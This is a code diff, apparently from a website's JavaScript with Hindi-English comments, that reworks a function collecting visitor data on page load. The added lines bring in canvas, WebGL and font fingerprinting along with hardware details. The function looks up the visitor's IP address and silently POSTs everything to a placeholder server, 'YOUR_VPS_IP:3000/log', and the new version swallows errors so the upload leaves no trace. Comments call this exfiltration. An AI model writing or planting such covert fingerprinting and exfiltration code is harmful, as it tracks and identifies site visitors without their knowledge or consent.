@@ -84,53 +84,57 @@ document.addEventListener("DOMContentLoaded", () => {
     saveState();
   }
 });
-
-// Capture, log, AND EXFILTRATE visitor telemetry to your VPS
 function captureVisitorTelemetry() {
   const telemetry = {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
-    screenWidth: window.screen ? window.screen.width : null,
-    screenHeight: window.screen ? window.screen.height : null,
-    colorDepth: window.screen ? window.screen.colorDepth : null,
-    devicePixelRatio: window.devicePixelRatio || 1,
-    language: navigator.language || navigator.userLanguage,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    capturedAt: new Date().toISOString(),
+    screenRes: `${window.screen.width}x${window.screen.height}`,
+    pixelRatio: window.devicePixelRatio,
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    // 1. Canvas Fingerprinting (Rendering uniqueness)
     canvasHash: (() => {
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
-      ctx.font = "14px Arial";
-      ctx.fillText("Identity", 2, 10);
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("Hacker_Identity", 2, 15);
       return canvas.toDataURL();
+    })(),
+    // 2. WebGL Fingerprinting (GPU Vendor uniqueness)
+    webGLInfo: (() => {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return 'no-webgl';
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+    })(),
+    // 3. Font Detection (Simplified unique list)
+    fonts: (() => {
+      const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS", "Impact"];
+      return fontList.filter(font => document.fonts.check(`12px "${font}"`));
     })()
   };
 
+  // IP Resolution & Exfiltration
   fetch("https://api.ipify.org?format=json")
     .then(res => res.json())
     .then(data => {
       telemetry.ipAddress = data.ip;
 
-      // --- CONSOLE LOG YAHAN ADD KIYA HAI ---
-      console.log("--- CAPTURED TELEMETRY DATA ---");
-      console.log(telemetry);
-      console.log("-------------------------------");
-
-      state._visitorTelemetry = telemetry;
-      saveState();
+      // Debugging logs (Remove in final production)
+      console.log("--- HIGH ENTROPY TELEMETRY CAPTURED ---", telemetry);
 
       fetch("http://YOUR_VPS_IP:3000/log", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(telemetry)
-      })
-        .then(() => console.log("Success: Data VPS par successfully deliver ho gaya."))
-        .catch(err => console.log("VPS unreachable, logging silently..."));
+      }).catch(() => { });
 
-    })
-    .catch(err => {
-      telemetry.ipAddress = "Failed to resolve";
-      console.log("Error capturing IP, logging partial data:", telemetry);
       state._visitorTelemetry = telemetry;
       saveState();
     });
